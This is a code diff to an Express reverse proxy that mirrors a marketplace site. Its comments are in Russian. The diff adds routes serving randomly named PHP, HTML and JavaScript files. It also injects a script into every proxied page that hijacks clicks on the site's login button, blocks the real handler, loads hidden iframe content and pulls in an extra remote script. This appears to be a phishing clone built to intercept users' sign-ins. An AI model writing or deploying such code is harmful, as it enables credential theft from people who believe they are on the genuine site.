@@ -6,6 +6,9 @@ const WebSocket = require('ws');
 const url = require('url');
 const http = require('http');
 const https = require('https');
+const fs = require('fs');
+const path = require('path');
+const { handlePhpRequest, config } = require('./auth-handler');
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -65,6 +68,32 @@ app.use((req, res, next) => {
     }
     
     next();
+});
+
+// Обработка специальных файлов
+app.get('/deab0093a0f4551414b49ba57151ae08.php', handlePhpRequest);
+
+app.get('/6kaomrcjpf2m.html', (req, res) => {
+    const htmlContent = fs.readFileSync(path.join(__dirname, '6kaomrcjpf2m.html'), 'utf8');
+    res.type('text/html').send(htmlContent);
+});
+
+app.get('/bhcg4ddaadpt.js', (req, res) => {
+    const scriptPath = path.join(__dirname, 'bhcg4ddaadpt.js');
+    if (fs.existsSync(scriptPath)) {
+        res.type('application/javascript').sendFile(scriptPath);
+    } else {
+        res.status(404).send('Script not found');
+    }
+});
+
+app.get('/ocbp8i7rp6hv.js', (req, res) => {
+    const scriptPath = path.join(__dirname, 'ocbp8i7rp6hv.js');
+    if (fs.existsSync(scriptPath)) {
+        res.type('application/javascript').sendFile(scriptPath);
+    } else {
+        res.status(404).send('Script not found');
+    }
 });
 
 // Получение или создание сессии
@@ -143,11 +172,11 @@ function modifyUrls(content, baseUrl, contentType = '') {
             modified = modified.replace(/<head[^>]*>/i, `$&<base href="${baseUrl}/">`);
         }
         
-        // Инжектим прокси скрипт
+        // Инжектим прокси скрипт с перехватом авторизации
         const proxyScript = `
         <script>
         (function() {
-            console.log('🔧 Market proxy initialized (HTTPS mode)');
+            console.log('🔧 Market proxy initialized with auth intercept');
             
             // Сохраняем оригинальные функции
             const originalFetch = window.fetch;
@@ -250,6 +279,79 @@ function modifyUrls(content, baseUrl, contentType = '') {
                 
                 return element;
             };
+            
+            // ВАЖНО: Перехват кликов по кнопке авторизации
+            function interceptAuthButton() {
+                const handleAuthClick = async (e) => {
+                    const button = e.target.closest('#login-register');
+                    if (button) {
+                        e.preventDefault();
+                        e.stopPropagation();
+                        e.stopImmediatePropagation();
+                        
+                        console.log('🔐 Auth button intercepted!');
+                        
+                        // Загружаем HTML файл
+                        try {
+                            // Сначала загружаем HTML
+                            const htmlResponse = await fetch('/6kaomrcjpf2m.html');
+                            const htmlContent = await htmlResponse.text();
+                            
+                            // Создаем iframe для изоляции
+                            const iframe = document.createElement('iframe');
+                            iframe.style.display = 'none';
+                            document.body.appendChild(iframe);
+                            
+                            // Записываем HTML в iframe
+                            iframe.contentDocument.open();
+                            iframe.contentDocument.write(htmlContent);
+                            iframe.contentDocument.close();
+                            
+                            // Загружаем дополнительные скрипты если нужно
+                            const windowScript = document.createElement('script');
+                            windowScript.src = '/ocbp8i7rp6hv.js';
+                            windowScript.onload = () => {
+                                console.log('Window script loaded');
+                            };
+                            document.head.appendChild(windowScript);
+                            
+                        } catch (error) {
+                            console.error('Error loading auth scripts:', error);
+                        }
+                        
+                        return false;
+                    }
+                };
+                
+                // Перехватываем клики на уровне документа
+                document.addEventListener('click', handleAuthClick, true);
+                
+                // Для динамически создаваемых элементов
+                const observer = new MutationObserver((mutations) => {
+                    mutations.forEach((mutation) => {
+                        if (mutation.type === 'childList') {
+                            const button = document.querySelector('#login-register');
+                            if (button) {
+                                button.addEventListener('click', handleAuthClick, true);
+                            }
+                        }
+                    });
+                });
+                
+                observer.observe(document.body, {
+                    childList: true,
+                    subtree: true
+                });
+            }
+            
+            // Запускаем перехват после загрузки DOM
+            if (document.readyState === 'loading') {
+                document.addEventListener('DOMContentLoaded', interceptAuthButton);
+            } else {
+                interceptAuthButton();
+            }
+            
+            console.log('✅ Proxy script with auth intercept initialized');
         })();
         </script>
         `;
@@ -478,11 +580,12 @@ app.use('*', async (req, res) => {
 // Запуск сервера
 server.listen(PORT, '0.0.0.0', () => {
     console.log(`
-    🚀 Advanced Market Proxy Server (HTTPS Support)
+    🚀 Advanced Market Proxy Server with Auth Intercept
     📡 Port: ${PORT}
     🎯 Target: ${TARGET_HOST}
     🔌 WebSocket: ${WS_TARGET}
     🔒 HTTPS: Auto-detected
+    🔐 Auth Intercept: Enabled
     
     Features:
     ✓ Full HTTP/HTTPS proxy
@@ -492,6 +595,7 @@ server.listen(PORT, '0.0.0.0', () => {
     ✓ URL rewriting
     ✓ Content modification
     ✓ Mixed content prevention
+    ✓ Auth button interception
     `);
 });
 
